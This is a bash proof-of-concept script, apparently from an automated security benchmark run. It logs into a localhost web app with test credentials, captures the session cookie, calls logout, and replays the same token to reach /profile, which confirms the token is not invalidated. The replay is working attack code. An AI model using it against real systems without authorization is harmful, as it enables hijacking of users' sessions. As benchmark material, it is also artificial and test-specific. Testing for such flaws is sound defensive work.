#!/bin/bash
# POC: Demonstrates that session tokens remain valid after logout endpoint is called, allowing unauthorized access to protected resources with the same token.
# Target: ./repo
# Created: 2025-11-04T19:38:44.877Z
# Session: benchmark-XBEN-024-24-mhkyvn4q

# Token Reuse After Logout - POC
# Demonstrates that session tokens remain valid after logout is called

TARGET_URL="http://localhost:5000"
USERNAME="testuser123"
PASSWORD="Password123"

echo "=== Token Reuse After Logout - POC ==="
echo ""

# Step 1: User logs in
echo "[*] Step 1: User logs in"
LOGIN_RESPONSE=$(curl -s -i -X POST "$TARGET_URL/login" \
  -d "username=$USERNAME&password=$PASSWORD")

# Extract session token from Set-Cookie header
SESSION_TOKEN=$(echo "$LOGIN_RESPONSE" | grep -i "Set-Cookie:" | grep -o "session=[^;]*" | cut -d= -f2)

if [ -z "$SESSION_TOKEN" ]; then
  echo "[-] Failed to extract session token from login response"
  echo "Response:"
  echo "$LOGIN_RESPONSE"
  exit 1
fi

echo "[+] Session token obtained: $SESSION_TOKEN"
echo ""

# Step 2: Verify session grants access to /profile
echo "[*] Step 2: Verify valid session grants access to /profile"
PROFILE_BEFORE=$(curl -s -w "\n%{http_code}" -b "session=$SESSION_TOKEN" "$TARGET_URL/profile")
HTTP_CODE_BEFORE=$(echo "$PROFILE_BEFORE" | tail -n 1)
PROFILE_BODY_BEFORE=$(echo "$PROFILE_BEFORE" | head -n -1)

echo "[+] HTTP Status: $HTTP_CODE_BEFORE"
if [ "$HTTP_CODE_BEFORE" = "200" ]; then
  echo "[+] Profile accessible with valid session"
  echo "[+] Response contains user data:"
  echo "$PROFILE_BODY_BEFORE" | head -c 200
  echo "..."
else
  echo "[-] Unexpected status code before logout: $HTTP_CODE_BEFORE"
fi
echo ""

# Step 3: Call logout endpoint
echo "[*] Step 3: User calls logout endpoint"
LOGOUT_RESPONSE=$(curl -s -i -b "session=$SESSION_TOKEN" "$TARGET_URL/logout")
LOGOUT_HTTP_CODE=$(echo "$LOGOUT_RESPONSE" | head -n 1 | grep -o "[0-9]\{3\}")

echo "[+] Logout response HTTP: $LOGOUT_HTTP_CODE"
echo "$LOGOUT_RESPONSE" | grep -i "Set-Cookie"
echo ""

# Step 4: VULNERABILITY TEST - Try to access protected resource with same token
echo "[*] Step 4: Attempt to access /profile with SAME session token after logout"
PROFILE_AFTER=$(curl -s -w "\n%{http_code}" -b "session=$SESSION_TOKEN" "$TARGET_URL/profile")
HTTP_CODE_AFTER=$(echo "$PROFILE_AFTER" | tail -n 1)
PROFILE_BODY_AFTER=$(echo "$PROFILE_AFTER" | head -n -1)

echo "[+] HTTP Status after logout: $HTTP_CODE_AFTER"

if [ "$HTTP_CODE_AFTER" = "200" ]; then
  echo ""
  echo "========== VULNERABILITY CONFIRMED =========="
  echo "[!] CRITICAL: Session token is STILL VALID after logout!"
  echo "[!] Attacker can continue using captured token after legitimate logout"
  echo "[!] Protected resource /profile is accessible without valid session"
  echo ""
  echo "Profile data returned after logout:"
  echo "$PROFILE_BODY_AFTER" | head -c 300
  echo ""
  echo "============================================="
  exit 0
else
  echo "[-] Profile correctly denied after logout (HTTP $HTTP_CODE_AFTER)"
  echo "[-] Session invalidation appears to be working"
  exit 1
fi